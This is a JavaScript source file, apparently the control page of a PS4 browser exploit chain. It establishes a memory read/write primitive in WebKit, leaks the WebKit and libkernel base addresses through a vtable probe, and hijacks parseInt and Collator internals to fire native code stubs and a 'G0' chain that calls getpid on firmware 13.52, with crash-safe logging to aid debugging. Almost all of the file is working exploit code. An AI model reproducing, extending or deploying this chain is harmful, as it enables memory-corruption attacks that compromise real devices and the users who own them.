/** stub_call.js UI — crash-safe logs survive tab death. */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-4";
import { createCrashLog } from "./log_persist.js";
import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
import {
    persistSessionBases, saveLibkernelSession, saveLastFnPtr,
} from "./libkernel_resolve.js";
import {
    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
    STUB_LAST_STEP_KEY, loadStubCap,
} from "./stub_call.js?v=stub-7";
import { fireG0Smoke, fireG0Getpid, disarmStubG0, resetG0Prep } from "./stub_g0_fire.js?v=stub-g0-1";

const BUILD = "stub-page-7";
const params = new URLSearchParams(location.search);
let lines = [], ready = false, busy = false, collatorPin = null;
const retain = [];

const crashLog = createCrashLog({
    ssLog: "wk-stub-log",
    ssState: "wk-stub-state",
    ssBuild: "wk-stub-build",
    buildId: BUILD,
    maxLines: 120,
    flushMs: 200,
    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN|2E|LK-)/,
});

function $(id) { return document.getElementById(id); }

function log(tag, d) {
    const line = tag + (d ? "  " + d : "");
    lines.push(line);
    if (lines.length > 120) lines.shift();
    crashLog.append(line, tag);
    const o = $("out");
    if (o) {
        o.textContent = lines.join("\n");
        o.scrollTop = o.scrollHeight;
    }
}

function flushLog() {
    crashLog.flushSync();
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
    crashLog.persistState(msg, cls || "");
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function chainWebkitBase(off) {
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    if (nativeFn && off.wk_expm1_builtin) {
        const derived = nativeFn.sub32(off.wk_expm1_builtin);
        if (derived) webkitBase = derived;
    }
    return webkitBase;
}

/** expm1 walk — same lightweight path as index_rw Start. */
function persistWebkitBasesLight(p, off) {
    if (!p || !off) return null;
    const cell = p.leakval(Math.expm1);
    const nativeFn = read8p(p, read8p(p, cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
    if (!nativeFn) return null;
    const webkitBase = off.wk_expm1_builtin
        ? nativeFn.sub32(off.wk_expm1_builtin)
        : null;
    persistSessionBases(nativeFn, webkitBase, { trust: "stub" });
    return webkitBase;
}

function fillLkInput(lk, fnPtr) {
    const hex = String(lk).replace(/^0x/i, "");
    const inp = $("lk-in");
    if (inp) inp.value = hex;
    try { sessionStorage.setItem("wk-libkernelBase", hex); } catch (_) { }
    if (fnPtr) saveLastFnPtr(fnPtr);
}

function onLkFoundHot(lk, hit) {
    fillLkInput(lk, hit && hit.fnPtr);
    saveLibkernelSession(lk, hit && hit.iatRva != null ? hit.iatRva : null, { forced: true });
    const via = hit ? (hit.method + "/" + hit.via) : "?";
    log("LK-OK", lk + " (" + via + ") — autofilled");
    log("LK-HOT", "reads=0 — Arm or Fire");
    state("lk hot — Arm / Fire", "ok");
    flushLog();
}

async function run2e(fromStart) {
    if (!ready || !window.p) return false;
    if (!fromStart && busy) return false;
    const p = window.p;
    const off = loadEffectiveOff();
    let webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        try {
            webkitBase = persistWebkitBasesLight(p, off);
            if (webkitBase) log("WEBKIT-BASE", String(webkitBase));
        } catch (e) {
            log("WEBKIT-BASE-WARN", e.message || String(e));
        }
    }
    if (!webkitBase) {
        log("LK-SKIP", "no webkitBase — Start first");
        state("Start first", "bad");
        flushLog();
        return false;
    }

    busy = true;
    const btn2e = $("btn-2e");
    if (btn2e) btn2e.disabled = true;
    log("2E-LK", BUILD + " — vtable leak + lk vote");
    flushLog();

    try {
        const vtslots = params.get("vtslots");
        const result = await probeLibkernelViaVtable({
            p: p,
            carrier: window._wkCarrier || null,
            webkitBase: webkitBase,
            off: off,
            log: log,
            read8: read8p,
            read4: read4p,
            yieldFn: function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); },
            opts: {
                full: params.get("full") === "1",
                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
                retain: retain,
            },
        });
        if (result.ok && result.lk) {
            onLkFoundHot(result.lk, result.hit);
            return true;
        }
        log("LK-HINT", "miss — ?g=drain:512 or ?full=1, then 2e again");
        state("2e lk miss", "bad");
        flushLog();
        return false;
    } catch (e) {
        log("LK-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("2e error", "bad");
        flushLog();
        return false;
    } finally {
        busy = false;
        if (btn2e && ready) btn2e.disabled = false;
    }
}

function lkFromInput() {
    const raw = $("lk-in").value.trim();
    if (!raw) {
        try {
            const s = sessionStorage.getItem("wk-libkernelBase");
            if (s) return parseAddr(s);
        } catch (_) { }
        return null;
    }
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80) return p;
    return p.sub32(0x13b20);
}

function stubFireMode() {
    const q = params.get("stubfire") || "g0getpid";
    if (q === "direct" || q === "g0" || q === "g0getpid" || q === "smoke") return q;
    return "g0getpid";
}

function stubMode() {
    const q = params.get("stub");
    if (q === "collator" || q === "arm" || q === "fire") return q;
    return "parseint";
}

function stubOpts() {
    const cached = (typeof window !== "undefined" && window._stubCap) || loadStubCap();
    return {
        log: log,
        flush: flushLog,
        stubKind: params.get("stubkind") || "syscall",
        useTextarea: params.get("arg") === "ta",
        carrier: window._wkCarrier || null,
        retain: retain,
        reuseCap: cached,
        preTrim: function () {
            try { trimExploitDebris(); } catch (_) { }
        },
    };
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    if (!detected.off)
        throw new Error("unknown FW UA=" + (navigator.userAgent || "?").slice(0, 60));
    return detected.off;
}

function syncRadios() {
    const m = stubMode();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.checked = el.value === m;
    });
    const fm = stubFireMode();
    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
        el.checked = el.value === fm;
    });
}

function showLastCrashStep() {
    try {
        const last = sessionStorage.getItem(STUB_LAST_STEP_KEY);
        if (last) log("LAST-CRASH-STEP", last);
        const prev = sessionStorage.getItem("wk-stub-log");
        if (prev) {
            lines = prev.split("\n").filter(Boolean).slice(-100);
            const o = $("out");
            if (o) o.textContent = lines.join("\n");
        }
    } catch (_) { }
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    log("BOOT", BUILD + " mode=" + stubMode());
    flushLog();
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => {
                if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE|ATTEMPT/i.test(t)) {
                    log(t, d || "");
                    flushLog();
                }
            },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!window.p) throw new Error("no window.p");
        try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");
        if (!carrier.textarea) throw new Error("no carrier.textarea");
        log("PRIMITIVE-OK", "ta=0x" + (carrier.textareaAddress || "?")
            + " nativeFn=0x" + (carrier.native && carrier.native.nativeFn || "?")
            + " exec=0x" + (carrier.native && carrier.native.executable || "?"));
        if (stubMode() === "collator") {
            collatorPin = pinCollatorStub(retain);
            log("PIN-OK", "collator arena");
        }
        ready = true;
        $("btn-fire").disabled = false;
        $("btn-arm").disabled = false;
        if ($("btn-2e")) $("btn-2e").disabled = false;
        try {
            const wb = persistWebkitBasesLight(window.p, loadEffectiveOff());
            if (wb) log("WEBKIT-BASE", "saved " + wb);
        } catch (_) { }
        state("ready — 2e Leak+lk", "ok");
        flushLog();
        if (params.get("noauto2e") !== "1") {
            await run2e(true);
        }
    } catch (e) {
        log("FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("Start failed", "bad");
        flushLog();
    } finally {
        busy = false;
    }
}

function runArm() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
    busy = true;
    try {
        const off = loadEffectiveOff();
        log("ARM-TAP", "lk=" + lk);
        const r = fireStubSwapParseInt(window.p, off, lk, Object.assign({}, stubOpts(), { armOnly: true }));
        window._stubCap = { mainMf: r.mainMf, mainOrig: r.mainOrig, nativeFn: r.mainOrig, path: "armed" };
        log("ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored");
        state("arm OK — Fire uses parseInt(1)", "ok");
    } catch (e) {
        log("ARM-FAIL", e.message || String(e));
        state("arm failed", "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function runFire() {
    if (busy || !ready || !window.p) return;
    const mode = stubMode();
    const fireMode = (mode === "arm") ? "arm" : stubFireMode();
    const lk = lkFromInput();
    if (fireMode !== "g0" && fireMode !== "smoke" && !lk) {
        log("SKIP", "paste lk or run 2e");
        state("need lk", "bad");
        flushLog();
        return;
    }
    busy = true;
    log("FIRE-TAP", mode + " fire=" + fireMode + (lk ? " lk=" + lk : ""));
    flushLog();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const opts = stubOpts();
        if (mode === "arm") {
            runArm();
            return;
        }
        if (mode === "collator") {
            if (!collatorPin) collatorPin = pinCollatorStub(retain);
            const r = fireCollatorStub(p, collatorPin, lk, off, opts);
            log("STUB-OK", r.path + " result=" + r.result);
            state("collator done", "ok");
            return;
        }
        if (fireMode === "g0" || fireMode === "smoke") {
            fireG0Smoke(p, off, opts);
            log("G0-SMOKE-OK", "parseInt(1) survived — pivot entry OK");
            state("G0 smoke OK", "ok");
            return;
        }
        if (fireMode === "g0getpid") {
            const r = fireG0Getpid(p, off, lk, opts);
            const show = (r.framePeek > 0) ? r.framePeek : r.pid;
            log("G0-GETPID-OK", "pid=" + r.pid + (r.framePeek != null ? " peek=" + r.framePeek : ""));
            if (show > 0) {
                log("NATIVE-OK", "getpid=" + show + " — G0 path LIVE on 13.52");
                state("getpid " + show, "ok");
            } else {
                log("NATIVE-OK", "chain survived pid=0 — native entry works, check G0-FRAME line");
                state("native OK (pid=0 — see G0-FRAME)", "ok");
            }
            return;
        }
        log("STUB-WARN", "direct stub OOM expected on 13.52 — use ?stubfire=g0getpid");
        const r = fireStubSwapParseInt(p, off, lk, opts);
        log("STUB-OK", r.stubTag + " arg=" + r.fireArg + " js=" + r.result);
        state("survived js=" + r.result, "ok");
    } catch (e) {
        log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("failed @ " + (sessionStorage.getItem(STUB_LAST_STEP_KEY) || "?"), "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function init() {
    crashLog.startAutoFlush();
    showLastCrashStep();
    log("INIT", BUILD + " fire=" + stubFireMode() + " — direct stub OOMs; default g0getpid");
    flushLog();
    syncRadios();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.addEventListener("change", function () {
            const u = new URL(location.href);
            u.searchParams.set("stub", el.value);
            location.href = u.pathname + "?" + u.searchParams.toString();
        });
    });
    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
        el.addEventListener("change", function () {
            const u = new URL(location.href);
            u.searchParams.set("stubfire", el.value);
            location.href = u.pathname + "?" + u.searchParams.toString();
        });
    });
    window.addEventListener("beforeunload", function () {
        try {
            if (window.p) disarmStubG0(window.p);
        } catch (_) { }
        crashLog.flushSync();
    });
    $("btn-start").onclick = runStart;
    $("btn-2e").onclick = function () { run2e(); };
    $("btn-arm").onclick = runArm;
    $("btn-fire").onclick = runFire;
    const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("lk-in").value = saved;
}

init();
